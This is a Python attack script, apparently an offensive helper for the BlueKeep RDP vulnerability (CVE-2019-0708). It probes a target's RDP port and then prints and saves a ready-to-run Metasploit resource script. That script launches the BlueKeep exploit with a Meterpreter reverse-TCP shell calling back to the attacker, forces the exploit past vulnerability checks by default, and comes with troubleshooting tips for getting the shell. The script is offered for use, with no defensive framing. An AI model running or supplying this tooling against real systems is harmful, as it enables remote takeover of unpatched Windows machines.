#!/usr/bin/env python3

import os
import sys
import argparse
import socket
import subprocess
import time

def check_target_rdp(host, port=3389, timeout=5):
    """Check if the target has RDP service running and is potentially vulnerable."""
    try:
        # Try to connect to RDP port
        print(f"[*] Checking if target {host}:{port} has RDP service...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        
        if result == 0:
            print(f"[+] Target {host}:{port} has RDP port open")
            
            # Send a basic RDP connection request
            rdp_packet = bytes.fromhex("0300000b06e00000000000")
            sock.send(rdp_packet)
            
            try:
                response = sock.recv(4096)
                print(f"[+] Received response from RDP service: {len(response)} bytes")
                
                # Additional check could be done here to parse the response
                # and determine if the target is potentially vulnerable
                
                sock.close()
                return True
            except socket.timeout:
                print("[-] No response from RDP service (timeout)")
                sock.close()
                return False
        else:
            print(f"[-] Target {host}:{port} does not have RDP port open")
            return False
            
    except Exception as e:
        print(f"[-] Error checking target: {e}")
        return False

def print_metasploit_commands(target_ip, target_port=3389, lhost="127.0.0.1", lport=4444, target_id=0, force_exploit=True):
    """Display Metasploit commands for manual execution."""
    print("\n" + "="*60)
    print(" Manual Metasploit Commands for BlueKeep Exploitation")
    print("="*60)
    print("\nCopy and paste these commands into a Metasploit console (msfconsole):\n")
    
    print("use exploit/windows/rdp/cve_2019_0708_bluekeep_rce")
    print(f"set RHOSTS {target_ip}")
    print(f"set RPORT {target_port}")
    print(f"set TARGET {target_id}")
    print("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
    print(f"set LHOST {lhost}")
    print(f"set LPORT {lport}")
    
    # Add force exploit commands
    if force_exploit:
        print("set ForceExploit true")
        print("set AutoCheck false")
    
    print("exploit")
    
    print("\n" + "="*60)
    print(" Alternative method using resource script")
    print("="*60)
    
    # Create a resource script for easy execution
    script_name = "bluekeep_manual.rc"
    with open(script_name, "w") as f:
        f.write("use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")
        f.write(f"set RHOSTS {target_ip}\n")
        f.write(f"set RPORT {target_port}\n")
        f.write(f"set TARGET {target_id}\n")
        f.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        
        # Add force exploit to script
        if force_exploit:
            f.write("set ForceExploit true\n")
            f.write("set AutoCheck false\n")
        
        f.write("exploit\n")
    
    print(f"\nResource script created: {script_name}")
    print(f"Run Metasploit with: msfconsole -r {script_name}")
    
    print("\n" + "="*60)
    print(" Troubleshooting Tips")
    print("="*60)
    print("1. Make sure your target is running a vulnerable OS (Windows 7/Server 2008/etc)")
    print("2. Ensure there's no firewall blocking traffic on port 3389 or your LPORT")
    print("3. Try different TARGET values if automatic targeting fails")
    print("4. If the check fails, try with ForceExploit=true to bypass vulnerability checks")
    print("5. Ensure your LHOST is reachable from the target (not behind NAT without port forwarding)")
    print("6. Be patient - exploitation can take time")
    print("="*60)

def main():
    banner = """
    ____  __           __ __                            
   / __ )/ /_  _____  / //_/__  ___ ____     ____ _____ 
  / __  / / / / / _ \/ ,< / _ \/ -_) __/    / __// ___/ 
 / /_/ / /___/ /  __/ /| /  __/\__/_/     / /  / /__   
/_____/_____/_/\___/_/ |_\___/           /_/   \___/   
                                                       
 CVE-2019-0708 BlueKeep Direct Helper
 Target: Windows 2003/XP/Vista/7/Server 2008
 """
    
    print(banner)
    
    parser = argparse.ArgumentParser(description="BlueKeep Direct Helper")
    parser.add_argument("-i", "--rhost", required=True, help="Target IP address")
    parser.add_argument("-p", "--rport", type=int, default=3389, help="Target RDP port (default: 3389)")
    parser.add_argument("-l", "--lhost", required=False, help="Local host for reverse connection (default: auto-detect)")
    parser.add_argument("-o", "--lport", type=int, default=4444, help="Local port for reverse connection (default: 4444)")
    parser.add_argument("-t", "--target-id", type=int, choices=range(0, 6), default=0, 
                      help="Target ID (0: auto, 1: Win7 SP1, 2: Win7 SP0, 3: Win2008 R2 SP1)")
    parser.add_argument("-f", "--force", action="store_true", default=True, 
                      help="Add ForceExploit=true to commands (bypasses vulnerability checks)")
    args = parser.parse_args()
    
    # Auto-detect local IP if not provided
    lhost = args.lhost
    if not lhost:
        try:
            # Try to detect IP address
            s = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, text=True)
            lhost = s.stdout.strip().split()[0]
            print(f"[*] Auto-detected local IP: {lhost}")
        except:
            print("[-] Failed to auto-detect local IP. Please specify with -l/--lhost")
            sys.exit(1)
    
    # Check if target is accessible and has RDP open
    if check_target_rdp(args.rhost, args.rport):
        print("\n[+] Target appears to have RDP service running")
        print("[*] Generating Metasploit commands...\n")
        
        # Print Metasploit commands for manual execution
        print_metasploit_commands(args.rhost, args.rport, lhost, args.lport, args.target_id, args.force)
    else:
        print("\n[-] Target does not appear to have RDP service accessible")
        print("[*] Please check your target and network connectivity")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] An unexpected error occurred: {str(e)}")
        sys.exit(1)
